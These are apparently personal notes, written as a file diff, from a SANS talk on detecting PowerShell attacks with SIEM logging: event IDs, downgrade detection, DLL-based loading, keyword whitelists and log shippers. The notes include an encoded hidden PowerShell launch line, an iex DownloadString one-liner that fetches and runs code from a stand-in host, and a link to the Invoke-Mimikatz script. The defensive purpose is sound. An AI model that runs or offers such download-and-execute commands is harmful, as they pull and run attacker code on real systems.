@@ -1,0 +1,87 @@
+ SANS - Detecting Moden Powershell atacks with SIEM
+
+SANS
+
+Detecting Moden Powershell atacks with SIEM:
+https://www.youtube.com/watch?v=cgTIeB8EVhI
+
+Enable Module Logging for Powershell:
+Enable EventID 4103
+
+Script Block Logging - Event ID 4104
+Can log start/stop times - 4105 and 4106
+
+Transcription logging
+
+
+eventID 4688 - PowerShell Command Line
+powershell.exe -NoP -sta -NonI -W Hidden -Enc <base64encoded>
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://sans555.com/pwn')"
+
+
+Sample of PowerShell Evilness:
+PowerSploit - collection of evil modules and goodies
+PowerShell Empire - post-exploitation agent framework
+Nishang - useful all around pentesting framework
+Invoke-Mimikatz - memory based version of Mimikatz
+
+Attack devices:
+Rubber Ducky - keyboard emulation
+Bash Bunny - pure evilness with a cute bunny
+
+
+Blacklisting is NOT dead. This is unfair and untrue!
+It is NOT a wackamole game.
+
+iex = Invoke-Expression()
+
+PowerShell Downgrade Attacks:
+- bad guys don't like v5
+
+Downgrade attacks bypass security. Except EventID 400, which gives it away.
+Look for EngineVersion less than 5.
+
+PowerShell Command Monitoring
+JEA requires modifications and process changes
+Alternative solution is to parse and monitor commands from module logging.
+
+CommandInvocation(Get-SSHSession); "Get-SSHSession"
+ParameterBinding(Get-SSHSession): value="ExactMatch"; value="False"
+CommandInvocation(Remote-SSHSession):"Remove-SSHSession"
+CommandInvocation(Out-Null):"Out-Null"
+ParamterBinding(Remove-SSHSession):name="SSHSession"; value="SSH.SshSession"
+ParameterBinding(Out-Null):name="InputObject";value="True"
+
+PowerShell Whitelist Detection.
+https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
+Look for KeyWords such as Invoke-Mimikatz, Invole-...
+
+PowerShell does not equal PowerShell.exe
+- it can be loaded using DDLs
+
+System.Management.Automation.Dll
+System.Management.Automation.ni.Dll
+System.Reflection.Dll
+
+Catching requires monitoring DLL load events
+- Such as with Sysmon Event ID 7 or commercial software
+
+C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe can be used to load powershell Dlls.
+
+
+Summary:
+Simple detect can find a lot:
+- look for long command line lengths
+- look for encoding
+- check cmdlets against whitelist - awesome
+- look for downgrade attempts
+- look for PowerShell use outside powershell.exe
+
+
+#################
+Log Shipper:
+
+OpenSource:
+nxlog and winlogbeat.
+
+Start with sending EVERY log, but then afterwards, start reducing the logs as needed.
